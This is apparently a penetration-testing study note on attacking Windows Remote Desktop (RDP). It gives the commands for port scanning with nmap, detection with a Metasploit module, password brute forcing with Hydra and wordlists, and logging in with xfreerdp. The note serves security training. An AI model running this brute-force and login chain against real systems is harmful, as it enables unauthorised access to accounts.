# Exploiting RDP

- Remote Desktop Protocol
- Proprietary GUI remote access protocol owned by Microsoft
- Used to remotely connect and interact with a Windows system
- RDP uses TCP port ``3389`` by default
- RDP authentication requires a legitimate user account on the target system with password
- We can perform an RDP brute force attack to identify legitimate user credentials

## Demonstration

```bash
nmap -sV -p- $TRG
```

How to verify which port is running RDP?

- Verify by hand
- Use Metasploit

```bash
> use auxiliary/scanner/rdp/rdp_scanner
> set RHOSTS $TRG
> set RPORT <port>
```

Detection is done now time to find credentials with [[Hydra]]:

```bash
hydra -L common_users.txt -P unix_passwords.txt rdp://$TRG -s <port>
```

Now we can connect to the target using [[xfreerdp]]:

```bash
xfreerdp /u:<username> /p:<password> /v:$TRG:<port>
```
